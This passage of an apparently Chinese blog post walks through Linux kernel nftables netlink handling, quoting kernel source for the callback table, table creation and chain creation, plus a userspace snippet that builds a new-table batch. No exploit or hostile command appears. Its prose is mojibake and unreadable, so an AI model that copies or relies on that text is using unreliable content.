class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NONE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK_EXP2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_QUEUE3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_ULOG4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_OSF5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_IPSET6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_ACCT7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTNETLINK_TIMEOUT8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_CTHELPER9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NFTABLES10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_NFT_COMPAT11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_HOOK12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFNL_SUBSYS_COUNT13</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯¹<code>nftables</code>è¿›è¡Œæ“ä½œé‚£å°±å¾ˆæ˜æ˜¾æ˜¯0xa</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> struct nfnl_callback *</span></span><br><span class="line"><span class="function"><span class="title">nfnetlink_find_client</span><span class="params">(u16 type, <span class="keyword">const</span> struct nfnetlink_subsystem *ss)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">u8 cb_id = NFNL_MSG_TYPE(type);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cb_id &gt;= ss-&gt;cb_count)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;ss-&gt;cb[cb_id];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è·å¾—<code>subsystem</code>ä¹‹åå°±ä¼šè¿›å…¥ä¸Šé¢çš„å‡½æ•°ï¼Œæ‹¿åˆ°å¯¹åº”çš„å®¢æˆ·ç«¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnetlink_subsystem</span> <span class="title">nf_tables_subsys</span> =</span> &#123;</span><br><span class="line">    .name       = <span class="string">&quot;nf_tables&quot;</span>,</span><br><span class="line">    .subsys_id  = NFNL_SUBSYS_NFTABLES,</span><br><span class="line">    .cb_count   = NFT_MSG_MAX,</span><br><span class="line">    .cb     = nf_tables_cb,</span><br><span class="line">    .commit     = nf_tables_commit,</span><br><span class="line">    .<span class="built_in">abort</span>      = nf_tables_abort,</span><br><span class="line">    .cleanup    = nf_tables_cleanup,</span><br><span class="line">    .valid_genid    = nf_tables_valid_genid,</span><br><span class="line">    .owner      = THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfnl_callback</span> <span class="title">nf_tables_cb</span>[<span class="title">NFT_MSG_MAX</span>] =</span> &#123;</span><br><span class="line">[NFT_MSG_NEWTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_newtable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETTABLE] = &#123;</span><br><span class="line">.call_rcu= nf_tables_gettable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_deltable,</span><br><span class="line">.attr_count= NFTA_TABLE_MAX,</span><br><span class="line">.policy= nft_table_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWCHAIN] = &#123;</span><br><span class="line">.call_batch= nf_tables_newchain,</span><br><span class="line">.attr_count= NFTA_CHAIN_MAX,</span><br><span class="line">.policy= nft_chain_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETCHAIN] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getchain,</span><br><span class="line">.attr_count= NFTA_CHAIN_MAX,</span><br><span class="line">.policy= nft_chain_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELCHAIN] = &#123;</span><br><span class="line">.call_batch= nf_tables_delchain,</span><br><span class="line">.attr_count= NFTA_CHAIN_MAX,</span><br><span class="line">.policy= nft_chain_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWRULE] = &#123;</span><br><span class="line">.call_batch= nf_tables_newrule,</span><br><span class="line">.attr_count= NFTA_RULE_MAX,</span><br><span class="line">.policy= nft_rule_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETRULE] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getrule,</span><br><span class="line">.attr_count= NFTA_RULE_MAX,</span><br><span class="line">.policy= nft_rule_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELRULE] = &#123;</span><br><span class="line">.call_batch= nf_tables_delrule,</span><br><span class="line">.attr_count= NFTA_RULE_MAX,</span><br><span class="line">.policy= nft_rule_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWSET] = &#123;</span><br><span class="line">.call_batch= nf_tables_newset,</span><br><span class="line">.attr_count= NFTA_SET_MAX,</span><br><span class="line">.policy= nft_set_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETSET] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getset,</span><br><span class="line">.attr_count= NFTA_SET_MAX,</span><br><span class="line">.policy= nft_set_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELSET] = &#123;</span><br><span class="line">.call_batch= nf_tables_delset,</span><br><span class="line">.attr_count= NFTA_SET_MAX,</span><br><span class="line">.policy= nft_set_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWSETELEM] = &#123;</span><br><span class="line">.call_batch= nf_tables_newsetelem,</span><br><span class="line">.attr_count= NFTA_SET_ELEM_LIST_MAX,</span><br><span class="line">.policy= nft_set_elem_list_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETSETELEM] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getsetelem,</span><br><span class="line">.attr_count= NFTA_SET_ELEM_LIST_MAX,</span><br><span class="line">.policy= nft_set_elem_list_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELSETELEM] = &#123;</span><br><span class="line">.call_batch= nf_tables_delsetelem,</span><br><span class="line">.attr_count= NFTA_SET_ELEM_LIST_MAX,</span><br><span class="line">.policy= nft_set_elem_list_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETGEN] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getgen,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWOBJ] = &#123;</span><br><span class="line">.call_batch= nf_tables_newobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETOBJ] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELOBJ] = &#123;</span><br><span class="line">.call_batch= nf_tables_delobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETOBJ_RESET] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getobj,</span><br><span class="line">.attr_count= NFTA_OBJ_MAX,</span><br><span class="line">.policy= nft_obj_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_NEWFLOWTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_newflowtable,</span><br><span class="line">.attr_count= NFTA_FLOWTABLE_MAX,</span><br><span class="line">.policy= nft_flowtable_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_GETFLOWTABLE] = &#123;</span><br><span class="line">.call_rcu= nf_tables_getflowtable,</span><br><span class="line">.attr_count= NFTA_FLOWTABLE_MAX,</span><br><span class="line">.policy= nft_flowtable_policy,</span><br><span class="line">&#125;,</span><br><span class="line">[NFT_MSG_DELFLOWTABLE] = &#123;</span><br><span class="line">.call_batch= nf_tables_delflowtable,</span><br><span class="line">.attr_count= NFTA_FLOWTABLE_MAX,</span><br><span class="line">.policy= nft_flowtable_policy,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°<code>nfnetlink_subsystem</code>ç»“æ„ä½“ä¸­<code>cb</code>æˆå‘˜å³å®¢æˆ·ç«¯ï¼Œå†çœ‹å¯¹åº”çš„<code>nf_tables_cb</code>é’ˆå¯¹ä¸åŒçš„æ“ä½œå®šä¹‰äº†å¤šä¸ªå›è°ƒå®¢æˆ·ç«¯ï¼Œä¾‹å¦‚<code>NEWTABLEã€NEW_CHAIN</code>ä¹‹ç±»çš„æ“ä½œã€‚</p><h3 id="åˆ›å»ºtableæ“ä½œ"><a href="#åˆ›å»ºtableæ“ä½œ" class="headerlink" title="åˆ›å»ºtableæ“ä½œ"></a>åˆ›å»ºtableæ“ä½œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftnl_table</span> *<span class="title">table</span> =</span> nftnl_table_alloc();</span><br><span class="line">nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);</span><br><span class="line">nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> *<span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line"><span class="keyword">int</span> table_seq = seq;</span><br><span class="line"></span><br><span class="line">nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);</span><br><span class="line">nftnl_table_nlmsg_build_payload(nlh, table);</span><br><span class="line">nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">mnl_nlmsg_batch_next(batch);</span><br><span class="line"><span class="keyword">if</span> (nl == <span class="literal">NULL</span>)</span><br><span class="line">  errExit(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">                          mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>)</span><br><span class="line">  err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å°±æ˜¯ç”Ÿæˆä¸€ä¸ª<code>table</code>çš„å°ğŸŒ°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nc-&gt;call_batch) &#123;</span><br><span class="line">  err = nc-&gt;call_batch(net, net-&gt;nfnl, skb, nlh,</span><br><span class="line">                       (<span class="keyword">const</span> struct nlattr **)cda,</span><br><span class="line">                       &amp;extack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨å†…æ ¸ä¸­ä¼šè°ƒç”¨å®¢æˆ·ç«¯å¯¹åº”çš„<code>call_batch</code>æˆå‘˜ï¼Œè¿™é‡Œåˆ›å»º<code>table</code>å¯¹åº”çš„å°±æ˜¯<code>nf_tables_newtable</code>å‡½æ•°äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newtable</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">      struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line">u32 flags = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line">attr = nla[NFTA_TABLE_NAME];</span><br><span class="line">table = nft_table_lookup(net, attr, family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(table) != -ENOENT)</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line"><span class="keyword">return</span> nf_tables_updtable(&amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_TABLE_FLAGS]) &#123;</span><br><span class="line">flags = ntohl(nla_get_be32(nla[NFTA_TABLE_FLAGS]));</span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~NFT_TABLE_F_DORMANT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">table = kzalloc(<span class="keyword">sizeof</span>(*table), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (table == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_kzalloc;</span><br><span class="line"></span><br><span class="line">table-&gt;name = nla_strdup(attr, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (table-&gt;name == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_strdup;</span><br><span class="line"></span><br><span class="line">err = rhltable_init(&amp;table-&gt;chains_ht, &amp;nft_chain_ht_params);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> err_chain_ht;</span><br><span class="line"></span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;chains);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;sets);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;objects);</span><br><span class="line">INIT_LIST_HEAD(&amp;table-&gt;flowtables);</span><br><span class="line">table-&gt;family = family;</span><br><span class="line">table-&gt;flags = flags;</span><br><span class="line">table-&gt;handle = ++table_handle;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line">err = nft_trans_table_add(&amp;ctx, NFT_MSG_NEWTABLE);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_trans;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;table-&gt;<span class="built_in">list</span>, &amp;net-&gt;nft.tables);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_trans:</span><br><span class="line">rhltable_destroy(&amp;table-&gt;chains_ht);</span><br><span class="line">err_chain_ht:</span><br><span class="line">kfree(table-&gt;name);</span><br><span class="line">err_strdup:</span><br><span class="line">kfree(table);</span><br><span class="line">err_kzalloc:</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä½¿ç”¨<code>attr = nla[NFTA_TABLE_NAME];</code>æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨<code>table</code>ï¼Œå¦‚æœå­˜åœ¨åˆ™è°ƒç”¨<code>nf_tables_updtable(&amp;ctx);</code>è¿›è¡Œæ›´æ–°ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä½¿ç”¨<code>kzalloc</code>åˆ›å»ºï¼Œç„¶åæœ€åå°†å…¶æ”¾åˆ°ä¸Šä¸‹æ–‡ä¸­ï¼Œå¹¶ä¸”åŠ å…¥åˆ°<code>&amp;net-&gt;nft.tables</code>ä¸­ã€‚</p><h3 id="åˆ›å»ºchainæ“ä½œ"><a href="#åˆ›å»ºchainæ“ä½œ" class="headerlink" title="åˆ›å»ºchainæ“ä½œ"></a>åˆ›å»ºchainæ“ä½œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newchain</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">      struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line">u8 policy = NF_ACCEPT;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">u64 handle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_CHAIN_TABLE], family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chain = <span class="literal">NULL</span>;</span><br><span class="line">attr = nla[NFTA_CHAIN_NAME];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_HANDLE]) &#123;</span><br><span class="line">handle = be64_to_cpu(nla_get_be64(nla[NFTA_CHAIN_HANDLE]));</span><br><span class="line">chain = nft_chain_lookup_byhandle(table, handle, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line">attr = nla[NFTA_CHAIN_HANDLE];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">chain = nft_chain_lookup(net, table, attr, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(chain) != -ENOENT) &#123;</span><br><span 